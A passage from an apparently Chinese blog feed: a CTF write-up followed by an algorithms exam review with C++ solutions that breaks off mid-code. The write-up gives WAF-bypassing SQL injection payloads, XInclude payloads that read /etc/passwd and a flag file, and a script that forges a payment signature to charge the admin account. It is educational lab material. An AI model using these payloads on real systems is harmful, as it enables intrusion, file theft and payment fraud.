title="CoolCms"></a>CoolCms</h2><p>原来这个题一叶飘零学长出的额2333<br>这个网站两个地方可能存在漏洞一个就是<code>article.php</code>页面存在SQL注入，因为这里面id参数暴露了出来，另外就是在<code>write.php</code>页面上可能存在xxe文件读取<br>现在可能存在的注入页面输入3的时候就会出现<code>table flag????</code>，再fuzz测试一下发现<code>or，update，delete，</code>以及逗号等符号都被过滤了<br><a href="https://imgchr.com/i/iHBL9S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png" alt="iHBL9S.md.png"></a></p><p>本来就是飘零学长出的题目就去参考他的博客呀<br><a href="http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/" target="_blank" rel="noopener">http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/</a><br><a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p><p>我们可以从fuzz的结果发现这里面的<code>union</code>还有<code>select</code>都可以单独使用但一旦他们两个一起使用的时候，就会被waf掉，猜测后台写的正则是这样写的<code>|union select|</code>，我们就可以使用<code>%0b</code>将其绕过，也就是<code>union%0bselect</code><br>但是逗号又被过滤了，这个时候就可以用<code>join</code>去绕过<br><img src="https://s1.ax1x.com/2018/11/08/iHDk3F.png" alt="iHDk3F.png"><br>用<code>join</code>实现同样的效果<br><a href="https://imgchr.com/i/iHDAc4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png" alt="iHDAc4.md.png"></a></p><p><code>or</code>被过滤了，<code>information_schema</code>没法使用，虽然题目这里提示了我们表名为flag，但是字段名却无从知晓，这时候就可以利用联合填充来代替掉字段名和表名<br><img src="https://s1.ax1x.com/2018/11/08/iHDmH1.png" alt="iHDmH1.png"></p><p><a href="https://imgchr.com/i/iHDtHI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png" alt="iHDtHI.md.png"></a><br>可以发现现在字段名变成了1,2,3，所以要查找里面的内容可以用用下面的语句<br><code>select * from users where id=-1 union select 1,(select i.2 from (select 1,2,3 union select * from users)i limit 1,1),3;</code><br><a href="https://imgchr.com/i/iHDd4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png" alt="iHDd4f.md.png"></a></p><p>这样即可无需字段名来查找数据，然后通过limit语句一条条查即可，这里是因为逗号被过滤了所以我们用offset来替代<br>因此先测试一下哪一列有回显<br><code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select 4)l--+</code>发现第二列跟第四列有回显<br><a href="https://imgchr.com/i/iHD0C8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png" alt="iHD0C8.md.png"></a></p><p>接着直接用上面的套路读出flag的路径<code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select i.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)i limit 1 offset 1)l-- k</code><br>得到路径是<code>/home/fff123aggg</code><br><a href="https://imgchr.com/i/iHD2Eq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png" alt="iHD2Eq.md.png"></a><br>开始用xxe读取文件，先试一下<code>/etc/passwd</code>,成功回显<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iHDW5V" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png" alt="iHDW5V.md.png"></a><br>然后读取flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/fff123aggg"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到flag{316f87681354a715d6134c4b8166aa73}</p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>这个题是个代码审计的题目，先把源码给down下来<br>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要<code>888</code>积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。<br>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是<code>16</code>，这个东西后期有用，而且他有<code>30000</code>积分，够买很多flag了，<br><a href="https://imgchr.com/i/iHDqV1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png" alt="iHDqV1.md.png"></a><br><img src="https://s1.ax1x.com/2018/11/08/iHrJRU.png" alt="iHrJRU.png"></p><p>这里面学到了该如何审计python的代码，感觉跟php套路一样，还是得先去看一下设置文件对应就是这里面的<code>setting</code>文件，<br><a href="https://imgchr.com/i/iHrYzF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png" alt="iHrYzF.md.png"></a><br>发现里面有一个空的<code>real flag</code>只是出题人把他给删掉了，这里面的重要信息就是这个secret.key是用于构造签名的<br>其实这个<code>secret.key</code>已经给了的，也存在于源码里面<br><a href="https://imgchr.com/i/iHrUsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png" alt="iHrUsJ.md.png"></a><br>然后重点看<code>urls.py.</code>以及<code>views.py</code>,如果<code>views.py</code>不存在<code>urls.py</code>里面的函数说明是调用了框架自身调用的函数，对于这个题而言没必要去查看框架本身的代码<br>这段代码在注册方面本身是没有任何问题的，所以得看其他方面<br>再查看shop里面的<code>urls.py</code>以及<code>views.py</code>可以发现里面存在购买对于身份的验证操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payOrder</span><span class="params">(request, orderid)</span>:</span></span><br><span class="line">o = get_object_or_404(Order, id=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: o.id,</span><br><span class="line"><span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line"><span class="string">'good_id'</span>: o.good.id,</span><br><span class="line"><span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line"><span class="string">'good_price'</span>: o.good.price,</span><br><span class="line"><span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure></p><p>这段代码最后是跳到<code>payment</code>的路由下，我们可以继续追踪一下，发现<code>payment</code>下就一个<code>check</code>函数，关键的函数就在<code>views.py</code>里面，这里对交易做了详细的校验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPayment</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment"># print(request.body)</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'未知错误'</span>, <span class="string">'status'</span>: <span class="string">'danger'</span>&#125;</span><br><span class="line">sign = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> md5(RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + request.body).hexdigest() == sign:</span><br><span class="line">o = get_object_or_404(Order, id=request.POST.get(<span class="string">'order_id'</span>))</span><br><span class="line">g = get_object_or_404(Good, id=request.POST.get(<span class="string">'good_id'</span>))</span><br><span class="line">u = get_object_or_404(User, id=request.POST.get(<span class="string">'buyer_id'</span>))</span><br><span class="line"><span class="comment"># 检查订单是否为待支付状态</span></span><br><span class="line"><span class="keyword">if</span> o.status != Order.ONGOING:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 状态异常，可能已完成或已取消'</span></span><br><span class="line"><span class="comment"># 检查商品是否可购买</span></span><br><span class="line"><span class="keyword">elif</span> g.available != <span class="keyword">True</span> <span class="keyword">or</span> g.amount &lt;= <span class="number">0</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'商品 <span class="subst">&#123;g.id&#125;</span> 暂时不可购买，可能库存不足'</span></span><br><span class="line"><span class="comment"># 检查用户可用积分是否足够</span></span><br><span class="line"><span class="keyword">elif</span> u.profile.point &lt; g.price:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'用户 <span class="subst">&#123;u.username&#125;</span> 可用积分不足，无法完成支付'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> u.is_staff != <span class="keyword">True</span>:</span><br><span class="line">u.profile.point -= g.price</span><br><span class="line">u.save()</span><br><span class="line">g.amount -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> g.name == <span class="string">'FLAG'</span>:</span><br><span class="line">o.message = REAL_FLAG</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">o.message = <span class="string">f'fake_flag<span class="subst">&#123;&#123;&#123;md5(urandom(<span class="number">32</span>)).hexdigest()&#125;</span>&#125;&#125;&lt;br&gt;(购买“FLAG”才能获得真正的 flag)'</span></span><br><span class="line"><span class="keyword">if</span> g.amount &lt;= randint(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">g.amount += randint(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">g.save()</span><br><span class="line">o.status = Order.FINISHED</span><br><span class="line">o.save()</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 支付成功！'</span></span><br><span class="line">ret[<span class="string">'status'</span>] = <span class="string">'success'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">'签名不正确，数据可能被篡改！'</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/result.html'</span>, ret)</span><br></pre></td></tr></table></figure></p><p>商品从三方面进行了校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.检查订单是否为待支付状态</span><br><span class="line">2.检查商品是否可购买</span><br><span class="line">3.检查用户可用积分是否足够</span><br></pre></td></tr></table></figure></p><p>但是这三方面只是单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p><p>根据它里面的代码去构造signature就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'148'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,   <span class="comment">#admin账号id，从数据库得知</span></span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   <span class="comment"># 商品id也可从数据库得知</span></span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'250'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1541706305.953427'</span> <span class="comment">#时间戳支付订单上有</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure></p><p>得到签名之后抓支付的包修改对应参数发包即可<br><a href="https://imgchr.com/i/iHraL9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHraL9.md.png" alt="iHraL9.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/iHr6zD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png" alt="iHr6zD.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次月赛学到了几个点总结一下，第一就是学到PHP几个偏门小函数，第二就是一叶飘零学长出的题目的一波SQL注入的骚操作以及xxe文件读取的操作，第三就是执念于心学长出的逻辑漏洞的代码审计，如何去审计Django框架的代码，怎么去发现无双向检验的logic漏洞，复习去了2333</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;10月赛的时候去打那个瓜皮的领航杯(体验极差)，还是回来复现安恒的题目比较好
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>算法上机考试复习</title>
    <link href="0verwatch.top/algorithm-review.html"/>
    <id>0verwatch.top/algorithm-review.html</id>
    <published>2018-11-08T12:00:35.000Z</published>
    <updated>2018-11-08T14:06:09.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了<a id="more"></a>，2333</p><h2 id="迭代递归"><a href="#迭代递归" class="headerlink" title="迭代递归"></a>迭代递归</h2><h3 id="汽水瓶-考试考了类似的"><a href="#汽水瓶-考试考了类似的" class="headerlink" title="汽水瓶(考试考了类似的)"></a>汽水瓶(考试考了类似的)</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</p><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</p><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</p><h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> )<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">a = n/<span class="number">3</span>;</span><br><span class="line">b = n%<span class="number">3</span>;</span><br><span class="line">result += a;</span><br><span class="line">n = a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( n ==<span class="number">2</span>) result += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="跳台阶-考试考了类似的"><a href="#跳台阶-考试考了类似的" class="headerlink" title="跳台阶(考试考了类似的)"></a>跳台阶(考试考了类似的)</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h5 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h5><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h5 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h5 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> l=<span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">205</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">solve_1</span><span class="params">(<span class="keyword">int</span> n )</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span> count[<span class="number">205</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(count[n] != <span class="number">0</span> ) <span class="keyword">return</span> count[n];  <span class="comment">//这里有点像备忘录方法，不然直接递归这题会超时</span></span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">1</span> == n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">2</span> == n) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    count[n] = solve_1(n<span class="number">-1</span>)+solve_1(n<span class="number">-2</span>)%l;</span><br><span class="line">    <span class="keyword">return</span> count[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve_2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">2</span> ; i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i] = (dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>])%l;   <span class="comment">//关键是这个递推式</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;solve_1(n)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//递归</span></span><br><span class="line">        solve_2(n); <span class="comment">//动态规划</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进制转换-考试考了类似的"><a href="#进制转换-考试考了类似的" class="headerlink" title="进制转换(考试考了类似的)"></a>进制转换(考试考了类似的)</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p><h5 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h5><p>输入一个十进制正整数n(1≤n≤106) 。</p><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>输出n对应的八进制数，输出在一行。</p><h5 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h5 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(num!=<span class="number">0</span>)&#123;</span><br><span class="line">tmp = num%<span class="number">8</span>;</span><br><span class="line">num = num/<span class="number">8</span>;</span><br><span class="line">s[i++] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目也可以用栈去模拟，几进制自己灵活变通*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span 